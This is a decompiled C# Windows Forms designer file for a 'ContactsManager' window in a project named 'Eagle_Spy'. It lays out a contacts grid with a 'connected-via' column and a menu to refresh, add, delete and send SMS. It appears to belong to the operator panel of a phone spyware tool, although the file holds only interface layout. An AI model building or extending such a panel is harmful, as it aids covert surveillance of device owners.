﻿namespace Eagle_Spy
{
	// Token: 0x02000038 RID: 56
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class ContactsManager : global::System.Windows.Forms.Form
	{
		// Token: 0x0600040D RID: 1037 RVA: 0x00055518 File Offset: 0x00053718
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x0600040E RID: 1038 RVA: 0x00055558 File Offset: 0x00053758
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new global::System.Windows.Forms.DataGridViewCellStyle();
			this.DGV0 = new global::System.Windows.Forms.DataGridView();
			this.Column1 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column6 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column9 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column2 = new global::System.Windows.Forms.DataGridViewImageColumn();
			this.ctxMenu = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.RefreshToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SendSmsToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.AddToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DeleteToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SaveToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SaveAsToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.TOpacity = new global::System.Windows.Forms.Timer(this.components);
			this.PB = new global::System.Windows.Forms.ProgressBar();
			this.BoxTitle = new global::System.Windows.Forms.PictureBox();
			this.guna2BorderlessForm1 = new global::Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.guna2Panel2 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.label1 = new global::System.Windows.Forms.Label();
			this.guna2ControlBox1 = new global::Guna.UI2.WinForms.Guna2ControlBox();
			((global::System.ComponentModel.ISupportInitialize)this.DGV0).BeginInit();
			this.ctxMenu.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.BoxTitle).BeginInit();
			this.guna2Panel2.SuspendLayout();
			base.SuspendLayout();
			this.DGV0.AllowUserToAddRows = false;
			this.DGV0.AllowUserToDeleteRows = false;
			this.DGV0.AllowUserToResizeColumns = false;
			this.DGV0.AllowUserToResizeRows = false;
			dataGridViewCellStyle.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			dataGridViewCellStyle.ForeColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle.SelectionBackColor = global::System.Drawing.Color.FromArgb(36, 7, 115);
			dataGridViewCellStyle.SelectionForeColor = global::System.Drawing.Color.FromArgb(192, 192, 255);
			this.DGV0.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
			this.DGV0.AutoSizeColumnsMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
			this.DGV0.AutoSizeRowsMode = global::System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
			this.DGV0.BackgroundColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.DGV0.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.DGV0.CellBorderStyle = global::System.Windows.Forms.DataGridViewCellBorderStyle.None;
			this.DGV0.ColumnHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle2.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle2.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			dataGridViewCellStyle2.Font = new global::System.Drawing.Font("Calibri", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			dataGridViewCellStyle2.ForeColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle2.SelectionBackColor = global::System.Drawing.Color.FromArgb(36, 7, 115);
			dataGridViewCellStyle2.SelectionForeColor = global::System.Drawing.Color.FromArgb(192, 192, 255);
			dataGridViewCellStyle2.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
			this.DGV0.ColumnHeadersHeightSizeMode = global::System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.DGV0.Columns.AddRange(new global::System.Windows.Forms.DataGridViewColumn[] { this.Column1, this.Column6, this.Column9, this.Column2 });
			this.DGV0.ContextMenuStrip = this.ctxMenu;
			dataGridViewCellStyle3.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle3.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			dataGridViewCellStyle3.Font = new global::System.Drawing.Font("Calibri", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			dataGridViewCellStyle3.ForeColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle3.SelectionBackColor = global::System.Drawing.Color.FromArgb(36, 7, 115);
			dataGridViewCellStyle3.SelectionForeColor = global::System.Drawing.Color.FromArgb(192, 192, 255);
			dataGridViewCellStyle3.WrapMode = global::System.Windows.Forms.DataGridViewTriState.False;
			this.DGV0.DefaultCellStyle = dataGridViewCellStyle3;
			this.DGV0.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.DGV0.EditMode = global::System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
			this.DGV0.EnableHeadersVisualStyles = false;
			this.DGV0.GridColor = global::System.Drawing.Color.Blue;
			this.DGV0.Location = new global::System.Drawing.Point(0, 30);
			this.DGV0.Name = "DGV0";
			this.DGV0.RowHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
			dataGridViewCellStyle4.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle4.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			dataGridViewCellStyle4.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			dataGridViewCellStyle4.ForeColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle4.SelectionBackColor = global::System.Drawing.Color.FromArgb(36, 7, 115);
			dataGridViewCellStyle4.SelectionForeColor = global::System.Drawing.Color.FromArgb(192, 192, 255);
			dataGridViewCellStyle4.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.DGV0.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
			this.DGV0.RowHeadersVisible = false;
			dataGridViewCellStyle5.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			dataGridViewCellStyle5.ForeColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle5.SelectionBackColor = global::System.Drawing.Color.FromArgb(36, 7, 115);
			dataGridViewCellStyle5.SelectionForeColor = global::System.Drawing.Color.FromArgb(192, 192, 255);
			this.DGV0.RowsDefaultCellStyle = dataGridViewCellStyle5;
			this.DGV0.SelectionMode = global::System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
			this.DGV0.Size = new global::System.Drawing.Size(589, 395);
			this.DGV0.TabIndex = 3;
			this.DGV0.RowsAdded += new global::System.Windows.Forms.DataGridViewRowsAddedEventHandler(this.DGV0_RowsAdded);
			this.DGV0.RowsRemoved += new global::System.Windows.Forms.DataGridViewRowsRemovedEventHandler(this.DGV0_RowsRemoved);
			this.DGV0.SelectionChanged += new global::System.EventHandler(this.DGV0_SelectionChanged);
			this.Column1.HeaderText = "name";
			this.Column1.Name = "Column1";
			this.Column1.Width = 56;
			this.Column6.HeaderText = "number";
			this.Column6.Name = "Column6";
			this.Column6.Width = 67;
			this.Column9.HeaderText = "connected-via";
			this.Column9.Name = "Column9";
			this.Column9.Width = 96;
			this.Column2.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
			this.Column2.FillWeight = 1f;
			this.Column2.HeaderText = "";
			this.Column2.MinimumWidth = 2;
			this.Column2.Name = "Column2";
			this.Column2.SortMode = global::System.Windows.Forms.DataGridViewColumnSortMode.Programmatic;
			this.Column2.Width = 2;
			this.ctxMenu.ImageScalingSize = new global::System.Drawing.Size(20, 20);
			this.ctxMenu.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.RefreshToolStripMenuItem, this.SendSmsToolStripMenuItem, this.AddToolStripMenuItem, this.DeleteToolStripMenuItem, this.SaveToolStripMenuItem, this.SaveAsToolStripMenuItem });
			this.ctxMenu.Name = "ctxMenu";
			this.ctxMenu.ShowImageMargin = false;
			this.ctxMenu.Size = new global::System.Drawing.Size(100, 136);
			this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
			this.RefreshToolStripMenuItem.Size = new global::System.Drawing.Size(99, 22);
			this.RefreshToolStripMenuItem.Text = "Refresh";
			this.RefreshToolStripMenuItem.Click += new global::System.EventHandler(this.RefreshToolStripMenuItem_Click);
			this.SendSmsToolStripMenuItem.Name = "SendSmsToolStripMenuItem";
			this.SendSmsToolStripMenuItem.Size = new global::System.Drawing.Size(99, 22);
			this.SendSmsToolStripMenuItem.Text = "Send sms";
			this.SendSmsToolStripMenuItem.Click += new global::System.EventHandler(this.SendSmsToolStripMenuItem_Click);
			this.AddToolStripMenuItem.Name = "AddToolStripMenuItem";
			this.AddToolStripMenuItem.Size = new global::System.Drawing.Size(99, 22);
			this.AddToolStripMenuItem.Text = "Add";
			this.AddToolStripMenuItem.Click += new global::System.EventHandler(this.AddToolStripMenuItem_Click);
			this.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem";
			this.DeleteToolStripMenuItem.Size = new global::System.Drawing.Size(99, 22);
			this.DeleteToolStripMenuItem.Text = "Delete";
			this.DeleteToolStripMenuItem.Click += new global::System.EventHandler(this.DeleteToolStripMenuItem_Click);
			this.SaveToolStripMenuItem.Name = "SaveToolStripMenuItem";
			this.SaveToolStripMenuItem.Size = new global::System.Drawing.Size(99, 22);
			this.SaveToolStripMenuItem.Text = "Save";
			this.SaveToolStripMenuItem.Visible = false;
			this.SaveToolStripMenuItem.Click += new global::System.EventHandler(this.SaveToolStripMenuItem_Click);
			this.SaveAsToolStripMenuItem.Name = "SaveAsToolStripMenuItem";
			this.SaveAsToolStripMenuItem.Size = new global::System.Drawing.Size(99, 22);
			this.SaveAsToolStripMenuItem.Text = "Save As";
			this.SaveAsToolStripMenuItem.Visible = false;
			this.SaveAsToolStripMenuItem.Click += new global::System.EventHandler(this.SaveAsToolStripMenuItem_Click);
			this.TOpacity.Interval = 1;
			this.TOpacity.Tick += new global::System.EventHandler(this.TOpacity_Tick);
			this.PB.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.PB.Location = new global::System.Drawing.Point(0, 425);
			this.PB.Name = "PB";
			this.PB.Size = new global::System.Drawing.Size(589, 10);
			this.PB.TabIndex = 6;
			this.BoxTitle.BackColor = global::System.Drawing.Color.FromArgb(0, 0, 64);
			this.BoxTitle.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.BoxTitle.ErrorImage = null;
			this.BoxTitle.InitialImage = null;
			this.BoxTitle.Location = new global::System.Drawing.Point(0, 435);
			this.BoxTitle.Name = "BoxTitle";
			this.BoxTitle.Size = new global::System.Drawing.Size(589, 18);
			this.BoxTitle.TabIndex = 7;
			this.BoxTitle.TabStop = false;
			this.BoxTitle.Paint += new global::System.Windows.Forms.PaintEventHandler(this.BoxTitle_Paint);
			this.BoxTitle.Resize += new global::System.EventHandler(this.BoxTitle_Resize);
			this.guna2BorderlessForm1.BorderRadius = 15;
			this.guna2BorderlessForm1.ContainerControl = this;
			this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			this.guna2BorderlessForm1.ShadowColor = global::System.Drawing.Color.Blue;
			this.guna2BorderlessForm1.TransparentWhileDrag = true;
			this.guna2Panel2.BackColor = global::System.Drawing.Color.FromArgb(10, 0, 36);
			this.guna2Panel2.Controls.Add(this.guna2ControlBox1);
			this.guna2Panel2.Controls.Add(this.label1);
			this.guna2Panel2.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.guna2Panel2.Location = new global::System.Drawing.Point(0, 0);
			this.guna2Panel2.Name = "guna2Panel2";
			this.guna2Panel2.Size = new global::System.Drawing.Size(589, 30);
			this.guna2Panel2.TabIndex = 16;
			this.guna2Panel2.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.guna2Panel2_MouseDown);
			this.label1.AutoSize = true;
			this.label1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 14.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label1.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.label1.Location = new global::System.Drawing.Point(207, 3);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(127, 24);
			this.label1.TabIndex = 14;
			this.label1.Text = "Contacts List";
			this.guna2ControlBox1.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox1.FillColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox1.IconColor = global::System.Drawing.Color.White;
			this.guna2ControlBox1.Location = new global::System.Drawing.Point(541, 1);
			this.guna2ControlBox1.Name = "guna2ControlBox1";
			this.guna2ControlBox1.Size = new global::System.Drawing.Size(45, 29);
			this.guna2ControlBox1.TabIndex = 15;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(589, 453);
			base.Controls.Add(this.guna2Panel2);
			base.Controls.Add(this.DGV0);
			base.Controls.Add(this.PB);
			base.Controls.Add(this.BoxTitle);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Name = "ContactsManager";
			base.Opacity = 0.0;
			base.ShowIcon = false;
			this.Text = "ContactsManager";
			((global::System.ComponentModel.ISupportInitialize)this.DGV0).EndInit();
			this.ctxMenu.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.BoxTitle).EndInit();
			this.guna2Panel2.ResumeLayout(false);
			this.guna2Panel2.PerformLayout();
			base.ResumeLayout(false);
		}

		// Token: 0x04000352 RID: 850
		private global::System.ComponentModel.IContainer components;

		// Token: 0x0400035B RID: 859
		internal global::System.Windows.Forms.DataGridView DGV0;

		// Token: 0x0400035C RID: 860
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("ctxMenu")]
		internal global::System.Windows.Forms.ContextMenuStrip ctxMenu;

		// Token: 0x0400035D RID: 861
		internal global::System.Windows.Forms.ToolStripMenuItem RefreshToolStripMenuItem;

		// Token: 0x0400035E RID: 862
		internal global::System.Windows.Forms.ToolStripMenuItem AddToolStripMenuItem;

		// Token: 0x0400035F RID: 863
		internal global::System.Windows.Forms.ToolStripMenuItem DeleteToolStripMenuItem;

		// Token: 0x04000360 RID: 864
		internal global::System.Windows.Forms.ToolStripMenuItem SaveToolStripMenuItem;

		// Token: 0x04000361 RID: 865
		internal global::System.Windows.Forms.ToolStripMenuItem SaveAsToolStripMenuItem;

		// Token: 0x04000362 RID: 866
		internal global::System.Windows.Forms.Timer TOpacity;

		// Token: 0x04000363 RID: 867
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("PB")]
		internal global::System.Windows.Forms.ProgressBar PB;

		// Token: 0x04000364 RID: 868
		internal global::System.Windows.Forms.PictureBox BoxTitle;

		// Token: 0x04000365 RID: 869
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("Column1")]
		internal global::System.Windows.Forms.DataGridViewTextBoxColumn Column1;

		// Token: 0x04000366 RID: 870
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("Column6")]
		internal global::System.Windows.Forms.DataGridViewTextBoxColumn Column6;

		// Token: 0x04000367 RID: 871
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("Column9")]
		internal global::System.Windows.Forms.DataGridViewTextBoxColumn Column9;

		// Token: 0x04000368 RID: 872
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("Column2")]
		internal global::System.Windows.Forms.DataGridViewImageColumn Column2;

		// Token: 0x04000369 RID: 873
		private global::Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;

		// Token: 0x0400036A RID: 874
		private global::Guna.UI2.WinForms.Guna2Panel guna2Panel2;

		// Token: 0x0400036B RID: 875
		private global::System.Windows.Forms.Label label1;

		// Token: 0x0400036C RID: 876
		private global::Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox1;

		// Token: 0x0400036D RID: 877
		internal global::System.Windows.Forms.ToolStripMenuItem SendSmsToolStripMenuItem;
	}
}
